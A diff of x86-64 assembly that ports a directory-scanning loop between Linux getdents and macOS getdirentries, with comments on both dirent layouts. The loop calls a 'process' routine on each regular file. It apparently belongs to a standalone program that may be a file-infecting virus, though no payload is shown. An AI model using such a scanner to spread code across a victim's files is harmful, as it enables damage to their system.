@@ -2,8 +2,8 @@
 
 %define translate_syscall call _translate_syscall
 
-BUF_SIZE    equ 1024
-LOCAL_VARS  equ 1024
+%define BUF_SIZE    1024
+%define LOCAL_VARS  1024
 
 bits 64
 default rel
@@ -76,39 +76,76 @@ _start:
                 jl          _return
 
 
-scandir:        xor         r10, r10
+;
+;on macOS getdirentries() syscall writes an array of structures of this type:
+;
+;     struct dirent { /* when _DARWIN_FEATURE_64_BIT_INODE is NOT defined */
+;             ino_t      d_ino;                /* file number of entry */           <<-- 4 bytes
+;             __uint16_t d_reclen;             /* length of this record */          <<-- 2 bytes    <<-- should use this value to navigate to next structure
+;             __uint8_t  d_type;               /* file type, see below */           <<-- 1 byte
+;             __uint8_t  d_namlen;             /* length of string in d_name */     <<-- 1 byte
+;             char    d_name[255 + 1];   /* name must be no longer than this */     <<-- might be followed by additional null (4 byte alignment ?) bytes
+;     };
+;
+;
+
+
+;on Linux getdents() syscall writes an array of structures of this type:
+;
+;           struct linux_dirent {
+;               unsigned long  d_ino;     /* Inode number */                        <<-- 8 bytes
+;               unsigned long  d_off;     /* Offset to next linux_dirent */         <<-- 8 bytes
+;               unsigned short d_reclen;  /* Length of this linux_dirent */         <<-- 2 bytes    <<-- use this to go to next structure
+;               char           d_name[];  /* Filename (null-terminated) */
+;                                 /* length is actually (d_reclen - 2 -
+;                                    offsetof(struct linux_dirent, d_name)) */
+;               /*
+;               char           pad;       // Zero padding byte
+;               char           d_type;    // File type (only since Linux                <<-- 1 byte, last byte of structure @ d_reclen-1
+;                                         // 2.6.4); offset is (d_reclen - 1)
+;               */
+;           }
+
+
+
+scandir:        lea         r10, [rsp-0x28]                     ;long *basep for macos
                 mov         rdx, BUF_SIZE
                 lea         rsi, [rsp - (BUF_SIZE + LOCAL_VARS)]
-                mov         rdi, [rsp-0x30]             ;directory fd
+                mov         rdi, [rsp-0x30]                     ;directory fd
                 mov         rax, __NR_getdents
                 translate_syscall
                 test        rax, rax
                 jle         .close
 
-                mov         [rsp-0x38], rax                     ; nread from getdents64
-                xor         rdx, rdx
-                mov         [rsp-0x40], rdx                     ;rsp-0x40 = getdents_idx
-
+                xor         r13, r13
+                mov         r12, rax
 .file:
-
                 lea         rdi, [rsp - (BUF_SIZE + LOCAL_VARS)]
-                add         rdi, [rsp-0x40]
+                add         rdi, r13
 
-                cmp         byte [rdi + 18], DT_REG
+                xor         edx, edx
+
+                test        r15b, r15b
+                jz          .linux_dirent
+                mov         dx, word [rdi + 4]                  ; macos d_reclen
+                mov         al, byte [rdi + 6]                  ; macos d_type
+                add         rdi, 8                              ; macos d_name
+                jmp         .increment_idx
+.linux_dirent:
+                mov         dx, word [rdi + 0x10]               ; linux d_reclen
+                dec         edx
+                mov         al, byte [rdi + rdx]                ; linux d_type
+                inc         edx
+                add         rdi, 18                             ; linux d_name
+.increment_idx:                
+                add         r13, rdx
+
+                cmp         al, DT_REG
                 jne         .next
 
-                add         rdi, 19                             ; d_name[]
                 call        process
-
 .next:
-
-                lea         rdi, [rsp - (BUF_SIZE + LOCAL_VARS)]
-                add         rdi, [rsp-0x40]
-                movzx       rax, word [rdi + 16]                ; d_reclen
-                add         rax, [rsp-0x40]
-                mov         [rsp-0x40], rax
-                mov         rdx, [rsp-0x38]                     ; compare getdents64 idx vs nread
-                cmp         rax, rdx                            ;
+                cmp         r13, r12
                 jl          .file
                 jmp         scandir
 
@@ -276,7 +313,7 @@ _translate_syscall:                                             ; expecting r15 
                 test        r15, r15                            ; anything else on macos
                 jz          .ready
                 push        rdi
-                push        rcx                
+                push        rcx
                 lea         rdi, [rel linux_syscalls]
                 mov         rcx, num_syscalls
                 repne       scasb
